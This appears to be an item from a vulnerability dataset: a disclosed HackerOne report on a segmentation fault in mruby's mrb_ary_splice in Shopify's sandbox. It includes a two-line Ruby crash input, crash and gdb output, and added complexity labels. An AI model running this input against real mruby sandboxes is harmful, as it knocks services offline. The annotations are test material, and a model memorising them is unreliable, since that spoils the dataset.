@@ -1,0 +1,38 @@
+{
+  "reported_to": "shopify-scripts",
+  "reported_by": "jpenalbae ",
+  "title": "SIGSEV on mrb_ary_splice",
+  "content": "\nSample\nThe following code causes a SIGSEV when executed under the sandbox\nCode 27 Bytes\n1t0me=methods\n2t0me[0,0]=t0me\nCrash\nHere we can see the crash (full crash output attached)\nCode 2.42 KiB\n1$ bin/sandbox /tmp/mrb_ary_splice-crash.rb\n2bin/sandbox:21: [BUG] Segmentation fault at 0x00005200000004\n3ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]\n4\n5-- Control frame information -----------------------------------------------\n6c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\n7c:0002 p:0201 s:0005 E:0010a8 EVAL   bin/sandbox:21 [FINISH]\n8c:0001 p:0000 s:0002 E:0024b0 (none) [FINISH]\n9\n10-- Ruby level backtrace information ----------------------------------------\n11bin/sandbox:21:in `<main>'\n12bin/sandbox:21:in `sandbox_eval'\n13\n14-- Machine register context ------------------------------------------------\n15 RIP: 0x00007ff2a22bcf58 RBP: 0x0000000000000028 RSP: 0x00007ff2a0e2aa20\n16 RAX: 0x00007ff2a0e8c6f0 RBX: 0x0000000000000005 RCX: 0x0000000000000001\n17 RDX: 0x0000005200000004 RDI: 0x00007ff2a0e2c4e0 RSI: 0x00007ff2a0e34550\n18  R8: 0x00007ff2a0e2c000  R9: 0x00007ff2a0e8c900 R10: 0x0000000000000004\n19 R11: 0x0000000000000000 R12: 0x0000000000000084 R13: 0x0000000000000042\n20 R14: 0x00007ff2a0e34550 R15: 0x00007ff2a0e4d940 EFL: 0x0000000000010246\n21\n22-- C level backtrace information -------------------------------------------\n23/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7ff2a65c4ea5]\n24/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7ff2a65c50dc]\n25/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7ff2a649f364]\n26/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7ff2a6550dbe]\n27/lib/x86_64-linux-gnu/libpthread.so.0 [0x7ff2a6223ed0]\n28/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_ary_splice+0x108) [0x7ff2a22bcf58] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/include/mruby/boxing_word.h:83\n29/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_ary_aset+0x177) [0x7ff2a22be337] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:789\n30/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x762) [0x7ff2a22c3cf2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n31/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7ff2a22c9567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n32/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7ff2a229d173] ../../../../ext/mruby_engine/eval_monitored.c:68\n33/lib/x86_64-linux-gnu/libpthread.so.0 [0x7ff2a621a464]\n34/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7ff2a559630d]\nCrash debug\nCode 1.31 KiB\n1(gdb) r\n2Starting program: /usr/bin/ruby bin/sandbox /tmp/mrb_ary_splice-crash.rb\n3[Thread debugging using libthread_db enabled]\n4Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n5[New Thread 0x7ffff7ff5700 (LWP 5511)]\n6[New Thread 0x7ffff2348700 (LWP 5565)]\n7\n8Program received signal SIGSEGV, Segmentation fault.\n9[Switching to Thread 0x7ffff2348700 (LWP 5565)]\n10mrb_ary_splice (mrb=mrb@entry=0x7ffff23494e0, ary=ary@entry=..., head=<optimized out>, len=<optimized out>, len@entry=0, rpl=...)\n11    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:615\n12615         mrb_field_write_barrier_value(mrb, (struct RBasic*)a, argv[i]);\n13(gdb) x/2i $rip\n14=> 0x7ffff37d9f58 <mrb_ary_splice+264>: cmp    BYTE PTR [rdx],0x5\n15   0x7ffff37d9f5b <mrb_ary_splice+267>: jbe    0x7ffff37d9f24 <mrb_ary_splice+212>\n16(gdb) i r rdx\n17rdx            0x5200000004     352187318276\n18(gdb) list *($rip)\n190x7ffff37d9f58 is in mrb_ary_splice (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:615).\n20610         value_move(a->ptr + head + argc, a->ptr + tail, a->len - tail);\n21611       }\n22612\n23613       for (i = 0; i < argc; i++) {\n24614         *(a->ptr + head + i) = *(argv + i);\n25615         mrb_field_write_barrier_value(mrb, (struct RBasic*)a, argv[i]);\n26616       }\n27617\n28618       a->len = size;\n29619\n30(gdb)\nmrb_field_write_barrier_value macro equals to:\nCode 159 Bytes\n1#define mrb_field_write_barrier_value(mrb, obj, val) do{\\\n2  if (!mrb_immediate_p(val)) mrb_field_write_barrier((mrb), (obj), mrb_basic_ptr(val)); \\\n3} while (0)\nmrb_immediate_p macro equals to:\nCode 84 Bytes\n1#define mrb_immediate_p(x) (mrb_type(x) < MRB_TT_HAS_BASIC)  // <-- Bug happens here\nmrb_type() code:\nCode 395 Bytes\n1static inline enum mrb_vtype\n2mrb_type(mrb_value o)\n3{\n4  switch (o.w) {\n5  case MRB_Qfalse:\n6  case MRB_Qnil:\n7    return MRB_TT_FALSE;\n8  case MRB_Qtrue:\n9    return MRB_TT_TRUE;\n10  case MRB_Qundef:\n11    return MRB_TT_UNDEF;\n12  }\n13  if (o.value.i_flag == MRB_FIXNUM_FLAG) {\n14    return MRB_TT_FIXNUM;\n15  }\n16  if (o.value.sym_flag == MRB_SYMBOL_FLAG) {\n17    return MRB_TT_SYMBOL;\n18  }\n19  return o.value.bp->tt;\n20}\nThe bug happens once mrb_type() returns and mrb_immediate_p macro tries to compare against MRB_TT_HAS_BASIC.\nImpact\nDoS of the service running the ruby sandbox. Does not look like that this could lead to remote code execution, but I would not discard it if the value of argv[i] could be controlled by the user.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Uncontrolled Resource Consumption"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1481959800,
+  "report_url": "https://hackerone.com/reports/182027",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Execute the following Ruby code in a sandbox environment: `t0me=methods; t0me[0,0]=t0me`"
+    ],
+    [
+      2,
+      "Observe the segmentation fault (SIGSEGV) when the mrb_ary_splice function attempts to access invalid memory"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a segmentation fault in mruby's array splice operation (mrb_ary_splice) when attempting to perform a self-referential array assignment. The crash occurs due to improper type checking in the mrb_immediate_p macro when comparing against MRB_TT_HAS_BASIC, leading to an invalid memory access.",
+  "reason": "While the vulnerability involves understanding Ruby internals and memory management, the triggering condition is relatively straightforward (self-referential array assignment). The vulnerability doesn't require complex state manipulation or multiple interacting components. The core issue is in a single macro's type checking logic.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
